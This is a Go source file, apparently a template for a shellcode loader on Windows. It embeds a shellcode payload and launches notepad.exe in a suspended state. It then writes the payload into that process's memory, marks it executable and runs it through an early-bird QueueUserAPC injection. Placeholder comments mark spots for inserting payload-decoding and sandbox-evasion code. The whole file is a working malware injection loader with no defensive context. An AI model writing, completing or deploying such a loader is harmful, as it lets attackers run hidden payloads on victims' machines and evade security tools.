package main

import (
	_ "embed"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	//__IMPORT__
)

//go:embed shellcode
var shellcode []byte

//__DECODE__

func main() {
	//__SANDBOX__
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	program, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	args, _ := syscall.UTF16PtrFromString("")
	_ = windows.CreateProcess(
		program,
		args,
		nil, nil, true,
		windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	fmt.Println("ok")
	_, _, _ = WriteProcessMemory.Call(uintptr(procInfo.Process), addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(uintptr(procInfo.Process), addr,
		uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	_, _ = windows.ResumeThread(procInfo.Thread)
	_ = windows.CloseHandle(procInfo.Process)
	_ = windows.CloseHandle(procInfo.Thread)
}
